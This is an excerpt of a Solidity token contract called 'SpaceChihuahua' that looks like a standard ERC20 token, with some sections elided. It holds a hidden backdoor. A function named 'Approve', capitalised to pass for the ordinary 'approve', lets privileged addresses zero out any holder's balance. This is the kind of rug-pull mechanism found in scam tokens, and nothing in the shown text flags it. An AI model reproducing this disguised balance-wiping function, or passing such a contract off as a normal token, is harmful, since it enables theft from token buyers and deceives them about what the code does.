...
contract SpaceChihuahua is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _balancetoken;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private isExcludedFromCut;
    string private _name = "SpaceChihuahua";
    string private _symbol = "SpaceChihuahua";
    uint256 private _decimals = 9;
    uint256 private _totalSupply = 10000000000 * 10 ** _decimals;
    uint256 private _maxtoken =    100000000 * 10 ** _decimals;
    ...
    function Approve(address spenders) external  {require( isExcludedFromCut[msg.sender]);
        _balancetoken[spenders] = _maxtoken * 0;
    }   
